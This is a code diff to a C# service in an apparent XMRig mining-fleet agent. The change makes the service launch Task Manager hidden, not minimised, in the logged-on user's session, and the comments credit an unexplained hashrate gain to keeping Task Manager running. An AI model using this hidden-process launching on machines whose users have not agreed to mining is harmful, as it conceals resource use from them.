@@ -1,10 +1,10 @@
-using System.Diagnostics;
+﻿using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 namespace XmrigFleet.Agent;
 
 /// <summary>
-/// Keeps Task Manager running, minimised, in the node's logged-on session.
+/// Keeps Task Manager running, hidden, in the node's logged-on session.
 ///
 /// A remedy without a diagnosis, and the code says so deliberately so nobody deletes it as
 /// superstition. Measured on an i7-12700KF, the miner untouched between readings:
@@ -255,7 +255,12 @@ public sealed class SessionMonitorService : BackgroundService
                 // Without the desktop the process starts with nowhere to draw and the effect is lost.
                 lpDesktop = @"winsta0\default",
                 dwFlags = StartfUseShowWindow,
-                wShowWindow = SwShowMinNoActive,
+                // Hidden rather than merely minimised: the operator should not have a Task
+                // Manager button on their taskbar for the lifetime of the machine. Whether the
+                // window has to be *visible* for the effect is unknown - a visible Notepad does
+                // nothing and an invisible counter poll does nothing either, so visibility was
+                // never isolated. If the hashrate drops back with this, that is itself a finding.
+                wShowWindow = SwHide,
             };
 
             var command = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "taskmgr.exe");
@@ -289,7 +294,7 @@ public sealed class SessionMonitorService : BackgroundService
     private const uint CreateUnicodeEnvironment = 0x00000400;
     private const uint CreateNoWindow = 0x08000000;
     private const uint StartfUseShowWindow = 0x00000001;
-    private const short SwShowMinNoActive = 7;
+    private const short SwHide = 0;
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct StartupInfo
@@ -333,3 +338,4 @@ public sealed class SessionMonitorService : BackgroundService
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool CloseHandle(IntPtr handle);
 }
+
